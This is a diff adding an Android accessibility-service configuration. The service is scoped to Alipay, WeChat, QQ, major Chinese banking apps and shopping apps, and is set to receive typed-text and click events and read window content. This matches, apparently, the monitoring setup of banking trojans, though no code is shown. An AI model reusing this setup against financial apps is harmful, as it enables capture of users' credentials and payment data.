@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="utf-8"?>
+<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+    android:description="@string/accessibility_service_description"
+    android:summary="@string/accessibility_service_summary"
+    android:packageNames="com.eg.android.AlipayGphone,com.tencent.mm,com.alibaba.android.rimet,com.tencent.mobileqq,com.chinamworld.bocmbci,com.icbc.banking,com.cmbc.personalbanking,com.abchina.mobilebank,com.bankcomm.BankComm,com.unionpay.uppay,com.jd.mobile,com.taobao.taobao,com.xunmeng.pinduoduo"
+    android:accessibilityEventTypes="typeWindowContentChanged|typeWindowStateChanged|typeViewTextChanged|typeViewClicked"
+    android:accessibilityFeedbackType="feedbackGeneric"
+    android:notificationTimeout="100"
+    android:canRetrieveWindowContent="true"
+    android:accessibilityFlags="flagIncludeNotImportantViews|flagReportViewIds|flagRetrieveInteractiveWindows" />
